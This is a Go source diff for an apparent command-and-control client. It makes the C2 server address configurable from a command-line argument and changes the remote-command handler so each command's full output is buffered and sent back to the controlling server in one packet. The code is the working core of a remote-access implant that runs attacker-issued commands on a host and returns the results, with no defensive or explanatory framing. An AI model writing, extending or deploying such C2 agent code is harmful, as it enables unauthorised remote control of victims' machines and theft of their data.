@@ -13,12 +13,19 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"strings"
 	"time"
 )
 
 func init() {
-	//addr = flag.String("addr", os.Getenv("SERVER_HOSTNAME")+":8081", "http service address")
-	addr = flag.String("addr", "localhost:8081", "http service address")
+	if len(os.Args) > 1 {
+		c2Ip := os.Args[1]
+		addr = flag.String("addr", c2Ip+":8081", "http service address")
+	} else {
+		addr = flag.String("addr", "localhost:8081", "http service address")
+
+	}
+
 	//addr = flag.String("addr", "192.168.50.19:8081", "http service address")
 }
 
@@ -87,6 +94,7 @@ func executeCommand(command string, c *Client) {
 
 	cmd.Start()
 	scanner := bufio.NewScanner(cmdReader)
+	var builder strings.Builder
 
 	go func() {
 		timer := time.NewTimer(5 * time.Second)
@@ -105,11 +113,10 @@ func executeCommand(command string, c *Client) {
 			default:
 				// Continue to process output if available
 				if scanner.Scan() {
-					commandOutput := scanner.Text() + "\n"
+					//commandOutput := scanner.Text() + "\n"
+					builder.WriteString(scanner.Text() + "\n")
 
-					log.Println(commandOutput)
-					transferPacket := encodeTransferPacket("command_output", commandOutput)
-					c.send <- transferPacket
+					//log.Println(commandOutput)
 				} else {
 					// If scanner.Scan() returns false, it might mean EOF or an error.
 					if err := scanner.Err(); err != nil {
@@ -123,6 +130,10 @@ func executeCommand(command string, c *Client) {
 					return // Exit the goroutine
 				}
 			}
+			completeOutput := builder.String()
+			transferPacket := encodeTransferPacket("command_output", completeOutput)
+			//log.Println("Complete Output:\n", completeOutput)
+			c.send <- transferPacket
 		}
 	}()
 }
